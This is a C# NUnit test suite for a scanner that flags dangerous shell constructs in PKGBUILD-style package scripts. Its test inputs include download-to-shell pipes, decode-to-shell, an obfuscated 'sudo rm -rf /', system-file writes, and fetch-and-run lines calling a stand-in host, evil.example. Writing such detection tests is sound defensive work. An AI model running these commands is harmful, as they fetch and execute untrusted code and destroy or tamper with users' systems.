using Atoll.Api.Services.Security;
using Atoll.Api.Services.Security.Scanning;
using NUnit.Framework;

namespace Atoll.Api.Tests.Security.Scanning;

public class ShellContentScannerTests
{
    private static List<SecurityFinding> Scan(string content, string path = "PKGBUILD")
    {
        return [.. ShellContentScanner.Scan(content, path)];
    }

    private static SecurityFinding SingleFinding(string content, string ruleId, string path = "PKGBUILD")
    {
        var matches = Scan(content, path).Where(f => f.RuleId == ruleId).ToList();
        Assert.That(matches, Has.Count.EqualTo(1),
            $"Expected exactly one '{ruleId}' finding, got {matches.Count}. " +
            $"All findings: {string.Join(", ", Scan(content, path).Select(f => $"{f.RuleId}/{f.Severity}"))}");
        return matches[0];
    }

    private static void AssertHasFinding(string content, string ruleId, FindingSeverity severity, string path = "PKGBUILD")
    {
        var findings = Scan(content, path);
        Assert.That(findings, Has.Some.Matches<SecurityFinding>(f => f.RuleId == ruleId && f.Severity == severity),
            $"Expected a {ruleId}/{severity} finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    // ===== network-to-shell (Critical) =====

    [TestCase("curl http://x | sh")]
    [TestCase("wget http://x | sh")]
    [TestCase("wget2 http://x | sh")]
    [TestCase("aria2c http://x | sh")]
    [TestCase("fetch http://x | sh")]
    [TestCase("lynx http://x | sh")]
    [TestCase("httpie http://x | sh")]
    [TestCase("http http://x | sh")]
    public void Network_to_shell_matches_all_known_downloaders(string content)
    {
        AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
    }

    [TestCase("curl http://x | sh")]
    [TestCase("curl http://x | bash")]
    [TestCase("curl http://x | zsh")]
    [TestCase("curl http://x | dash")]
    [TestCase("curl http://x | ksh")]
    [TestCase("curl http://x | fish")]
    public void Network_to_shell_matches_all_known_shells(string content)
    {
        AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
    }

    [TestCase("echo aGVsbG8= | base64 -d | sh")]
    [TestCase("echo aGVsbG8= | base64 | bash")]
    [TestCase("xxd -r file | sh")]
    public void Decode_to_shell_flags_decoders_piped_into_shell(string content)
    {
        AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
    }

    [TestCase("eval $(cat cmd)")]
    [TestCase("eval `cat cmd`")]
    [TestCase("eval base64 -d")]
    [TestCase(". $(cat cmd)", Description = "source builtin with command substitution")]
    public void Eval_indirection_flags_dynamic_command_execution(string content)
    {
        AssertHasFinding(content, "eval-indirection", FindingSeverity.Critical);
    }

    [TestCase("pkgver=$(date +%s)")]
    [TestCase("pkgver=`date +%s`")]
    public void Command_substitution_matches_dollar_paren_and_backtick(string content)
    {
        AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
    }

    [TestCase("cmd=${!target}")]
    public void Variable_indirection_flags_bash_indirect_expansion(string content)
    {
        AssertHasFinding(content, "variable-indirection", FindingSeverity.Medium);
    }

    [TestCase("echo x > /etc/passwd", Description = "redirect to /etc")]
    [TestCase("echo x >> /usr/bin/foo", Description = "append to /usr")]
    [TestCase("echo x > /bin/tool", Description = "/bin")]
    [TestCase("echo x > /sbin/tool", Description = "/sbin")]
    [TestCase("echo x > /var/log/x", Description = "/var")]
    [TestCase("echo x > /root/.bashrc", Description = "/root")]
    [TestCase("echo x > /opt/x", Description = "/opt")]
    [TestCase("echo x > /boot/x", Description = "/boot")]
    [TestCase("echo x > /lib/x", Description = "/lib")]
    [TestCase("tee /etc/foo", Description = "tee with /etc")]
    [TestCase("tee /home/user/.bashrc", Description = "tee with /home")]
    public void Write_outside_build_root_flags_system_path_writes(string content)
    {
        AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
    }

    [TestCase("echo x > ./local", Description = "relative path - inside build root")]
    [TestCase("echo x > $pkgdir/foo", Description = "$pkgdir is inside the build root")]
    public void Write_outside_build_root_ignores_relative_and_pkgdir_paths(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False,
            $"Unexpected write-outside-build-root finding. Got: {string.Join(", ", findings.Select(f => f.RuleId))}");
    }

    [TestCase("curl http://x | python evil.py")]
    [TestCase("curl http://x | perl evil.pl")]
    [TestCase("curl http://x | ruby evil.rb")]
    [TestCase("curl http://x | node evil.js")]
    [TestCase("curl http://x | eval")]
    public void Network_execution_matches_known_interpreters(string content)
    {
        AssertHasFinding(content, "network-execution", FindingSeverity.High);
    }

    [TestCase("sudo cmd", "sudo")]
    [TestCase("sudoedit /etc/sudoers", "sudoedit")]
    [TestCase("doas cmd", "doas")]
    [TestCase("pkexec cmd", "pkexec")]
    [TestCase("run0 cmd", "run0")]
    [TestCase("su root -c 'evil'", "su")]
    public void Privilege_escalation_flags_all_privilege_tools(string content, string tool)
    {
        var findings = Scan(content);
        var finding = findings.FirstOrDefault(f => f.RuleId == "privilege-escalation");
        Assert.That(finding, Is.Not.Null,
            $"Expected privilege-escalation finding for {tool}. Got: {string.Join(", ", findings.Select(f => f.RuleId))}");
        Assert.That(finding!.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(finding.Message, Does.Contain(tool));
    }

    [TestCase("echo pseudo sudoku", Description = "sudo substring but not invoked")]
    [TestCase("echo 'sudo'", Description = "display text in single quotes")]
    [TestCase("echo \"sudo is a tool\"", Description = "display text in double quotes")]
    public void Privilege_escalation_rejects_substring_and_display_matches(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
    }

    [TestCase("npm install x")]
    [TestCase("npx create-app")]
    [TestCase("yarn add x")]
    [TestCase("pnpm install")]
    [TestCase("pip install x")]
    [TestCase("pip3 install x")]
    [TestCase("uv pip install x")]
    [TestCase("poetry install")]
    [TestCase("cargo install x")]
    [TestCase("go install example.com/x@latest")]
    [TestCase("docker run -it x")]
    [TestCase("podman run -it x")]
    [TestCase("kubectl apply -f x")]
    public void Risky_tool_flags_known_package_managers_and_runners(string content)
    {
        AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
    }

    [Test]
    public void Risky_tool_inside_echo_string_is_not_flagged()
    {
        var findings = Scan("echo \"Run: curl http://example.com | sh to install\"");
        // curl|sh is display text inside double quotes - no risky-tool finding for curl.
        Assert.That(findings.Any(f => f.RuleId == "risky-tool" && f.Message.Contains("curl")), Is.False);
    }

    [Test]
    public void Hidden_character_is_flagged_as_critical()
    {
        var findings = Scan("echo rm\u200Brf");
        Assert.That(findings.Any(f => f.RuleId == "hidden-character" && f.Severity == FindingSeverity.Critical), Is.True);
    }

    [Test]
    public void Hidden_character_finding_snippet_is_the_trimmed_raw_line()
    {
        // The hidden char may appear before a trailing comment; the comment must remain in the snippet.
        var findings = Scan("echo rm\u200Brf # trailing");
        var finding = findings.First(f => f.RuleId == "hidden-character");

        Assert.That(finding.Snippet, Is.EqualTo("echo rm\u200Brf # trailing"));
    }

    [Test]
    public void Obfuscated_privilege_escalation_escalates_to_critical()
    {
        // sudo is split with empty quotes - invisible to plain grep but visible after de-obfuscation.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [Test]
    public void Obfuscated_network_to_shell_escalates_to_critical()
    {
        var finding = SingleFinding("c''u''rl https://evil.example/x.sh | s''h", "network-to-shell");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [Test]
    public void Obfuscated_network_execution_escalates_to_critical()
    {
        var finding = SingleFinding("c''url https://evil.example/x | p''ython evil.py", "network-execution");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [TestCase("")]
    [TestCase("   ")]
    [TestCase("pkgname=foo")]
    [TestCase("pkgver=1.0")]
    [TestCase("source=(https://example.com/foo.tar.gz::https://github.com/x/y/archive/v1.0.tar.gz)")]
    public void Scan_produces_no_findings_for_benign_content(string content)
    {
        Assert.That(Scan(content), Is.Empty);
    }

    [Test]
    public void Comment_only_line_produces_no_findings()
    {
        // The comment is stripped before any rule runs, so a malicious-looking construct inside a
        // comment must not be flagged.
        Assert.That(Scan("# curl http://x | sh"), Is.Empty);
    }

    [Test]
    public void Hash_inside_single_quotes_is_not_a_comment()
    {
        // The '#' here is literal text, not a comment - so the curl|sh inside is real and must be flagged.
        var findings = Scan("echo '# ${pkgver}' ; curl http://x | sh");

        Assert.That(findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
    }

    [Test]
    public void Multiple_findings_on_one_line_are_emitted()
    {
        var findings = Scan("sudo curl http://x | sh");

        Assert.That(findings.Select(f => f.RuleId),
            Does.Contain("network-to-shell").And.Contains("privilege-escalation"));
    }

    [Test]
    public void Each_line_of_content_is_scanned_independently()
    {
        var findings = Scan("echo hello\nsudo whoami\necho done");

        var sudoFindings = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
        Assert.That(sudoFindings, Has.Count.EqualTo(1));
        Assert.That(sudoFindings[0].Snippet, Is.EqualTo("sudo whoami"));
    }

    [Test]
    public void Path_is_preserved_in_each_finding()
    {
        var findings = Scan("sudo whoami", "subdir/foo.install");

        Assert.That(findings, Is.Not.Empty);
        Assert.That(findings, Has.All.Property(nameof(SecurityFinding.File)).EqualTo("subdir/foo.install"));
    }

    [Test]
    public void Snippet_is_trimmed_raw_line_even_when_indented()
    {
        var findings = Scan("   sudo whoami   ");

        Assert.That(findings[0].Snippet, Is.EqualTo("sudo whoami"));
    }

    [Test]
    public void Scan_does_not_emit_duplicate_findings_for_one_rule_on_one_line()
    {
        // Two $() substitutions on one line should still produce only one command-substitution finding,
        // because the regex finds a single match (the first one) and the rule fires once per match.
        var findings = Scan("a=$(x); b=$(y)");

        var commandSubs = findings.Where(f => f.RuleId == "command-substitution").ToList();
        Assert.That(commandSubs, Has.Count.EqualTo(1),
            $"Expected exactly one command-substitution finding. Got: {commandSubs.Count}");
    }

    [Test]
    public void Empty_lines_are_skipped()
    {
        var findings = Scan("\n\n   \n\nsudo whoami");

        Assert.That(findings.All(f => f.RuleId == "privilege-escalation"), Is.True);
        Assert.That(findings, Has.Count.EqualTo(1));
    }
}